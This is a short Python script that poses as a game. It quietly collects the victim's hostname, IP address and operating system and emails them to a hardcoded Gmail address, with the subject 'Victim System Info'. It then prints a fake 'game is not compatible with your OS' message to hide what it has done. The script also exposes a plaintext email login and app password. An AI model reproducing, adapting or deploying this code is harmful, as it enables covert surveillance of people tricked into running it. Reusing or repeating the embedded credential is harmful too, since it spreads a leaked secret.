import platform
import socket
import smtplib
from email.message import EmailMessage

def collect_system_info():
    return {
        'hostname': socket.gethostname(),
        'ip_address': socket.gethostbyname(socket.gethostname()),
        'os': platform.platform()
    }

def send_email(data):
    msg = EmailMessage()
    msg['Subject'] = 'Victim System Info'
    msg['From'] = 'judesomtochukwu32@gmail.com'
    msg['To'] = 'judesomtochukwu32@gmail.com'
    msg.set_content(str(data))

    try:
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
            smtp.login('judesomtochukwu32@gmail.com', 'xgjo rwdp pphf asag')
            smtp.send_message(msg)
    except Exception as e:
        print("Failed to send email:", e)

if __name__ == "__main__":
    info = collect_system_info()
    send_email(info)
    print("This game is not compatible with your OS. Please update and try again.")
